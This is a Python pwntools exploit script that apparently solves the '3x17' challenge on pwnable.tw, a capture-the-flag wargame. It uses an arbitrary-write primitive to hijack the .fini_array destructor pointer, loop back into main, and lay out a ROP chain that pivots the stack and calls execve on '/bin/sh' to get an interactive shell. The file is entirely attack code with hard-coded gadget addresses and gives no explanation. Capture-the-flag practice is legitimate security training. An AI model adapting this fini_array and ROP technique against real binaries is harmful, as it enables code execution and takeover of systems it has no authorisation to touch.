from pwn import * 

sh = process("./3x17") 
#sh = remote("chall.pwnable.tw", 10105)
fini_addr = 0x00000000004b40f0 
main = p64(0x0000000000401b6d) 
call_fini = p64(0x0000000000402960) 

pop_rdi = 0x0000000000401696 # pop rdi; ret; 
pop_rdx_rsi = 0x000000000044a309 #  pop rdx; pop rsi; ret;  
pop_rax = 0x000000000041e4af
syscall = 0x446e2c
leave = 0x401c4b
bin_sh_addr = fini_addr + 10*8

def write_addr(addr,data) : 
    sh.sendlineafter('addr:',str(addr)) 
    sh.sendafter('data:',data) 

if __name__ == "__main__"  : 
    write_addr(fini_addr, call_fini + main)
    write_addr(fini_addr + 2*8, p64(pop_rdi) + p64(bin_sh_addr)) 
    write_addr(fini_addr + 4*8, p64(pop_rdx_rsi) + p64(0) + p64(0x0))
    write_addr(fini_addr + 7*8, p64(pop_rax) + p64(0x3b))
    write_addr(fini_addr + 9*8, p64(syscall) + "/bin/sh\x00")
    raw_input("DEBUG")
    write_addr(fini_addr , p64(leave))
    sh.interactive()
